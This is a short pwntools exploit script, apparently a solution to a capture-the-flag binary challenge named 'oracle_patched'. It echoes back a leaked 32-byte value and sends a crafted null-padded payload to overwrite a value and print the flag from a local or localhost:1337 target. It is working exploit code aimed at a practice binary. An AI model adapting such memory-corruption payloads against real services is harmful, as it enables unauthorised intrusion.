from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        # set up Konsole
        context.terminal = ["konsole", "-e"]
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("localhost", 1337)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = """
break *0x40157f
break *0x401634
continue
""".format(
    **locals()
)

exe = "./oracle_patched"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"

io = start()

io.sendlineafter(b"instrument)?", cyclic(31))
line = io.recvline()
log.info(f"Line: {line}")

thought = io.recvline()[0:32]
log.info(f"Thought: {thought}")

io.sendafter(b"mind? ", thought)
io.sendlineafter(b"say? ", (b"\x00" * 24) + b"\x31" + (b"\x00" * 7))

io.recvline_endswith(b"reader.")
flag = io.recvline().decode().strip()
log.info(f"Flag: {flag}")
#io.interactive()